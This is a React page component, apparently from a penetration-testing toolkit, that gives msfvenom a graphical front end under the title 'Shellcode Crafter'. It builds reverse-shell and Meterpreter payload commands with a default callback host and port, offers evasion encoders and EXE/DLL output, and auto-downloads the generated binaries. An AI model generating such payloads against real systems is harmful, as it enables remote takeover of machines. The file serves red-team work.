'use client';

import { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Button } from "@/components/ui/button"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { apiClient } from '@/lib/api';
import type { ShellcodeRequest } from '@/lib/types';
import { Zap, Copy, Terminal, Loader2, AlertCircle, Download, FileCode, Binary } from "lucide-react"

const TEXT_FORMATS = ['c', 'csharp', 'python', 'perl', 'ruby', 'powershell', 'ps1', 'vbnet', 'js_be', 'js_le', 'java', 'bash', 'hex', 'num', 'vbscript', 'asp', 'aspx', 'jsp'];

const isTextFormat = (format: string) => TEXT_FORMATS.includes(format.toLowerCase());

export default function ShellcodePage() {
    const [formData, setFormData] = useState<ShellcodeRequest>({
        payload: 'windows/x64/meterpreter/reverse_tcp',
        lhost: '192.168.1.42',
        lport: '4444',
        format: 'raw',
        badchars: '',
        encoder: '',
    });

    const [shellcode, setShellcode] = useState<string>('');
    const [isBinary, setIsBinary] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState<string>('');

    const commandPreview = `msfvenom -p ${formData.payload} LHOST=${formData.lhost} LPORT=${formData.lport}${formData.format ? ` -f ${formData.format}` : ''}${formData.badchars ? ` -b ${formData.badchars}` : ''}${formData.encoder ? ` -e ${formData.encoder}` : ''}`;

    const handleInputChange = (field: keyof ShellcodeRequest, value: string | number) => {
        setFormData({ ...formData, [field]: value });
    };

    const handleGenerate = async () => {
        setIsLoading(true);
        setError('');
        setShellcode('');
        setIsBinary(false);

        try {
            const response = await apiClient.generateShellcode(formData);
            const base64 = response.shellcode;
            const format = formData.format || 'raw';

            if (TEXT_FORMATS.includes(format.toLowerCase())) {
                // Decode to text for display
                const decoded = window.atob(base64);
                setShellcode(decoded);
                setIsBinary(false);
            } else {
                // Binary format: trigger download
                setIsBinary(true);
                setShellcode(base64); // Store base64 just in case, or for preview

                const binaryString = window.atob(base64);
                const bytes = new Uint8Array(binaryString.length);
                for (let i = 0; i < binaryString.length; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }

                const blob = new Blob([bytes], { type: 'application/octet-stream' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `payload.${format === 'raw' ? 'bin' : format}`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
            }
        } catch (err: any) {
            setError(err.message || 'Failed to generate shellcode');
        } finally {
            setIsLoading(false);
        }
    };

    const handleDownload = () => {
        if (!shellcode) return;
        const binaryString = window.atob(isBinary ? shellcode : window.btoa(shellcode));
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        const blob = new Blob([bytes], { type: 'application/octet-stream' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `payload.${formData.format || 'bin'}`;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
    };

    const handleCopy = () => {
        navigator.clipboard.writeText(shellcode);
    };

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-3xl font-bold tracking-tight">Shellcode Crafter</h2>
                <p className="text-muted-foreground">
                    Interface graphique pour la génération de shellcode via MSFVenom.
                </p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* Configuration Form */}
                <Card>
                    <CardHeader>
                        <CardTitle className="flex items-center gap-2">
                            <Zap className="h-5 w-5 text-emerald-500" />
                            Configuration
                        </CardTitle>
                        <CardDescription>Paramètres de génération MSFVenom</CardDescription>
                    </CardHeader>
                    <CardContent className="space-y-4">
                        <div className="space-y-2">
                            <Label>Payload</Label>
                            <Select
                                value={formData.payload}
                                onValueChange={(v) => handleInputChange('payload', v)}
                            >
                                <SelectTrigger>
                                    <SelectValue placeholder="Select payload" />
                                </SelectTrigger>
                                <SelectContent>
                                    <SelectItem value="windows/x64/meterpreter/reverse_tcp">windows/x64/meterpreter/reverse_tcp</SelectItem>
                                    <SelectItem value="windows/x64/shell_reverse_tcp">windows/x64/shell_reverse_tcp</SelectItem>
                                    <SelectItem value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</SelectItem>
                                    <SelectItem value="windows/shell_reverse_tcp">windows/shell_reverse_tcp</SelectItem>
                                    <SelectItem value="test/messagebox" className="text-emerald-500 font-bold border-t mt-2">Test with MessageBox (x64)</SelectItem>
                                </SelectContent>
                            </Select>
                        </div>

                        <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-2">
                                <Label>LHOST</Label>
                                <Input
                                    value={formData.lhost}
                                    onChange={(e) => handleInputChange('lhost', e.target.value)}
                                    placeholder="192.168.1.42"
                                />
                            </div>
                            <div className="space-y-2">
                                <Label>LPORT</Label>
                                <Input
                                    value={formData.lport}
                                    onChange={(e) => handleInputChange('lport', e.target.value)}
                                    placeholder="4444"
                                />
                            </div>
                        </div>

                        <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-2">
                                <Label>Format</Label>
                                <Select
                                    value={formData.format || 'raw'}
                                    onValueChange={(v) => handleInputChange('format', v)}
                                >
                                    <SelectTrigger>
                                        <SelectValue placeholder="Raw" />
                                    </SelectTrigger>
                                    <SelectContent>
                                        <SelectItem value="raw">Raw (Binary)</SelectItem>
                                        <SelectItem value="c">C</SelectItem>
                                        <SelectItem value="csharp">C Sharp</SelectItem>
                                        <SelectItem value="python">Python</SelectItem>
                                        <SelectItem value="powershell">PowerShell</SelectItem>
                                        <SelectItem value="exe">EXE</SelectItem>
                                        <SelectItem value="dll">DLL</SelectItem>
                                        <SelectItem value="hex">Hex</SelectItem>
                                    </SelectContent>
                                </Select>
                            </div>
                            <div className="space-y-2">
                                <Label>Encoder</Label>
                                <Select
                                    value={formData.encoder || "none"}
                                    onValueChange={(v) => handleInputChange('encoder', v === "none" ? "" : v)}
                                >
                                    <SelectTrigger>
                                        <SelectValue placeholder="None (Raw)" />
                                    </SelectTrigger>
                                    <SelectContent>
                                        <SelectItem value="none">None (Raw)</SelectItem>
                                        <SelectItem value="x86/shikata_ga_nai">x86/shikata_ga_nai</SelectItem>
                                        <SelectItem value="x64/xor">x64/xor</SelectItem>
                                        <SelectItem value="x64/zutto_dekiru">x64/zutto_dekiru</SelectItem>
                                    </SelectContent>
                                </Select>
                            </div>
                        </div>

                        <div className="space-y-2">
                            <Label>Bad Chars</Label>
                            <Input
                                value={formData.badchars || ''}
                                onChange={(e) => handleInputChange('badchars', e.target.value)}
                                placeholder="\\x00\\x0a\\x0d"
                            />
                        </div>

                        <Button
                            className="w-full bg-emerald-500 hover:bg-emerald-600"
                            onClick={handleGenerate}
                            disabled={isLoading}
                        >
                            {isLoading ? (
                                <>
                                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                                    Génération...
                                </>
                            ) : (
                                <>
                                    <Zap className="mr-2 h-4 w-4" />
                                    {isTextFormat(formData.format || 'raw') ? 'Générer le code' : 'Générer & Télécharger'}
                                </>
                            )}
                        </Button>
                    </CardContent>
                </Card>

                {/* Output Display */}
                <div className="space-y-6">
                    {/* Command Preview */}
                    <Card className="bg-muted/50">
                        <CardHeader className="py-3">
                            <CardTitle className="text-sm font-medium flex items-center gap-2">
                                <Terminal className="h-4 w-4" />
                                msfvenom_command.sh
                            </CardTitle>
                        </CardHeader>
                        <CardContent>
                            <div className="bg-black/50 rounded-md p-3 font-mono text-xs text-emerald-400 break-all border border-emerald-500/20">
                                {commandPreview}
                            </div>
                            <Button
                                variant="ghost"
                                size="sm"
                                className="mt-2 h-8 text-muted-foreground hover:text-emerald-500"
                                onClick={() => navigator.clipboard.writeText(commandPreview)}
                            >
                                <Copy className="mr-2 h-3 w-3" /> Copy Command
                            </Button>
                        </CardContent>
                    </Card>

                    {/* Shellcode Output */}
                    {error && (
                        <div className="rounded-md bg-destructive/15 p-4 border border-destructive/50">
                            <div className="flex items-center">
                                <AlertCircle className="h-4 w-4 text-destructive mr-2" />
                                <span className="text-sm font-medium text-destructive">{error}</span>
                            </div>
                        </div>
                    )}

                    {shellcode && (
                        <Card>
                            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                                <CardTitle className="text-sm font-medium flex items-center gap-2">
                                    {isBinary ? <Binary className="h-4 w-4 text-blue-400" /> : <FileCode className="h-4 w-4 text-emerald-400" />}
                                    {isBinary ? 'Binary Output' : 'Source Code Output'}
                                </CardTitle>
                                <div className="flex gap-2">
                                    {!isBinary && (
                                        <Button variant="outline" size="sm" onClick={handleCopy}>
                                            <Copy className="mr-2 h-3 w-3" /> Copy
                                        </Button>
                                    )}
                                    <Button variant="outline" size="sm" onClick={handleDownload}>
                                        <Download className="mr-2 h-3 w-3" /> Download
                                    </Button>
                                </div>
                            </CardHeader>
                            <CardContent>
                                {isBinary ? (
                                    <div className="flex flex-col items-center justify-center p-8 border-2 border-dashed rounded-lg bg-muted/20">
                                        <Binary className="h-12 w-12 text-muted-foreground mb-4 opacity-20" />
                                        <p className="text-sm text-muted-foreground mb-4 text-center">
                                            Le payload binaire a été généré et téléchargé automatiquement.
                                        </p>
                                        <Button variant="secondary" onClick={handleDownload}>
                                            <Download className="mr-2 h-4 w-4" /> Télécharger à nouveau
                                        </Button>
                                    </div>
                                ) : (
                                    <div className="bg-black/80 rounded-md p-4 max-h-[400px] overflow-y-auto border border-white/10 mt-2">
                                        <code className="text-xs font-mono text-gray-400 break-all whitespace-pre-wrap">
                                            {shellcode}
                                        </code>
                                    </div>
                                )}
                            </CardContent>
                        </Card>
                    )}
                </div>
            </div>
        </div>
    );
}
